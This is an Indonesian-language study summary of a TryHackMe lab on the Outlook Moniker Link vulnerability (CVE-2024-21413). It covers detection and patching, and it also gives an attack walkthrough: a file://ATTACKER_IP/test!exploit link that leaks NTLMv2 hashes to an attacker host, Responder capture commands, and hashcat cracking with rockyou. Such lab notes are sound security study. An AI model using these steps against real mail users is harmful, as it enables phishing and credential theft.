```
=== CVE-2024-21413 Moniker Link - Resume Materi ===
[15 Mei 2026]

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 IDENTITAS KERENTANAN
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Nama     : Moniker Link
CVE      : CVE-2024-21413
Tanggal  : 13 Februari 2024
Penemu   : Haifei Li (Check Point Research)
Impact   : Remote Code Execution & Credential Leak
Severity : Critical
Complexity: Low
Score    : 9.8 / 10

Versi Terdampak :
  Office LTSC 2021    → dari 19.0.0
  365 Apps Enterprise → dari 16.0.1
  Office 2019         → dari 16.0.1
  Office 2016         → 16.0.0 sebelum 16.0.5435.1001

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 CARA KERJA KERENTANAN
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Masalah  : Outlook bypass Protected View saat proses Moniker Link
Protected View = mode read-only Outlook untuk email
                 berisi attachment/hyperlink dari luar organisasi

Normal (diblokir Protected View) :
  <a href="file://ATTACKER_IP/test">Click me</a>
  → Outlook tampilkan warning → user harus klik Yes

Exploit (bypass Protected View) :
  <a href="file://ATTACKER_IP/test!exploit">Click me</a>
  → Karakter ! membuat Protected View bingung → LANGSUNG LOLOS

Kenapa bisa kirim hash? :
  → Outlook pakai protokol SMB untuk akses file://
  → SMB otomatis kirim kredensial NTLM untuk autentikasi
  → Hash NTLMv2 korban terkirim ke IP penyerang tanpa korban sadar

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 ALUR SERANGAN LENGKAP
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PERSIAPAN PENYERANG
1. Konek VPN ke jaringan target
2. Cek IP interface VPN → ip a → cari tun0
3. Jalankan Responder (Terminal 1) :
   sudo responder -I tun0
   → Listening menunggu koneksi SMB masuk

KIRIM JEBAKAN
4. Buat exploit.py (Terminal 2) :
   nano exploit.py
5. Edit dua bagian penting :
   Baris 12 → ganti ATTACKER_MACHINE = IP tun0 kamu
   Baris 31 → ganti MAILSERVER = IP mesin target THM
6. Jalankan :
   python3 exploit.py
   → Masukkan password : attacker
   → Output : "Email delivered" = berhasil

KORBAN KENA
7. Korban buka Outlook → terima email CVE-2024-21413
8. Korban klik "Click me"
9. Windows otomatis kirim hash NTLMv2 via SMB ke IP tun0 kita

HASIL
10. Responder di Terminal 1 tampilkan hash NTLMv2 korban
11. Hash bisa di-crack offline dengan hashcat

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 TOOLS & SWITCH
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
RESPONDER
  sudo responder -I [interface]
  -I  → tentukan network interface yang dipakai
        Contoh : -I tun0 (VPN), -I eth0 (LAN)
  Fungsi : SMB/HTTP/FTP listener untuk tangkap hash NTLMv2
  Stop   : CTRL+C

HASHCAT
  hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
  -m 5600 → mode NetNTLMv2
  -O      → optimized kernel (lebih cepat, max 32 char)
  -w 3    → workload profile tinggi (layar bisa lag)
  Fungsi : crack hash NTLMv2 jadi password plaintext

IP A
  ip a
  Fungsi : lihat semua network interface dan IP address
  tun0   → interface VPN THM (IP yang dipakai di Moniker Link)
  eth0   → interface LAN lokal (JANGAN dipakai)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 STRUKTUR EXPLOIT.PY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Yang dilakukan script ini :
  → Ambil email penyerang & korban
  → Minta password untuk autentikasi SMTP
  → Buat konten HTML berisi Moniker Link berbahaya
  → Isi field Subject, From, To di email
  → Kirim email ke mail server target via SMTP port 25

Dua nilai yang WAJIB diganti :
  file://[IP tun0]/test!exploit  → IP Kali kamu lewat VPN
  smtplib.SMTP('[IP target]', 25) → IP mail server THM

Password SMTP untuk room ini : attacker

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 FORMAT HASH NTLMv2
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Pola : username::domain:challenge:response:blob

Contoh :
  tryhackme::THM-MONIKERLINK:30aca553...:1A54BB46...:0101...

Cara tahu tipenya :
  1. Responder tulis eksplisit → [SMB] NTLMv2-SSP
  2. Struktur hash mengikuti pola username::domain yang khas

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 DETEKSI — YARA RULE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Dibuat oleh : Florian Roth & X__Junior
Tanggal     : 17 Februari 2024

Yang dicari rule ini :
  $a1 → header "Subject: "      (wajib ada)
  $a2 → header "Received: "     (wajib ada)
  $xr1→ pola file:///\\ diikuti path + karakter ! + ekstensi file

Kondisi trigger :
  filesize < 1000KB
  + semua $a* harus ada ($a1 dan $a2)
  + minimal 1 dari $xr* harus ada ($xr1)

Analogi : YARA = anjing pelacak digital yang mencium
          "bau" Moniker Link berbahaya di setiap email

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 DETEKSI — WIRESHARK
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Alur paket SMB yang terlihat :
  1. Negotiate Protocol Response
  2. NTLMSSP_NEGOTIATE  → korban mulai minta autentikasi
  3. NTLMSSP_CHALLENGE  → server kirim tantangan
  4. NTLMSSP_AUTH       → korban kirim hash sebagai jawaban ← hash di sini
  5. STATUS_ACCESS_DENIED → akses ditolak (wajar, share tidak ada)

Info yang bisa dilihat di paket AUTH :
  Domain name, Username, Hostname, NTLMv2 Response (hash)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 REMEDIASI & MITIGASI
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Solusi Utama  : Update Office via Windows Update /
                Microsoft Update Catalog (patch Feb 2024)

Tidak Bisa    : Reconfigure Outlook untuk cegah serangan ini
                karena bypass terjadi di level Protected View

Tidak Disarankan : Block SMB sepenuhnya → merusak akses
                   network share yang legitimate

Bisa dilakukan : Block SMB di level firewall
                 (tergantung kebijakan organisasi)

Edukasi User  :
  → Jangan klik link sembarangan dari email tak dikenal
  → Preview link sebelum diklik
  → Forward email mencurigakan ke tim keamanan

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 ISTILAH PENTING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Moniker Link   = tipe hyperlink khusus Windows yang bisa
                 membuka aplikasi eksternal (file://, skype:, dll)
Protected View = fitur keamanan Outlook, buka email dalam
                 mode read-only dan blokir konten berbahaya
NTLM           = protokol autentikasi Windows
NTLMv2 Hash    = versi hash kredensial Windows yang dikirim
                 otomatis saat autentikasi SMB
SMB            = protokol Windows untuk berbagi file di jaringan
Responder      = tool untuk jadi listener palsu dan tangkap hash
NetNTLMv2      = nama tipe hash untuk hashcat (-m 5600)
PoC            = Proof of Concept, demo eksploitasi untuk
                 membuktikan kerentanan nyata ada
RCE            = Remote Code Execution, eksekusi kode dari jarak jauh
Credential Leak= kebocoran kredensial (username + hash password)
```